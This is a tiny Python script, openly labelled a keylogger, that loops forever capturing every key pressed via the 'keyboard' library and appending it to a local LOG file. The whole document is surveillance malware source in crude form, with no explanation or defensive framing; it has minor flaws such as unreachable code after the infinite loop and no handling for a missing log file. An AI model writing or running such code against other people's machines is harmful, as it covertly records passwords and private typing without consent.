import keyboard
while True:
	keytolog = keyboard.read_key()
	if keytolog != "":
		r = open("./LOG").read()
		f = open("./LOG", 'w')
		rf = str(r) + str(keytolog)
		f.write(rf)
input()

# Run ir for keylogger
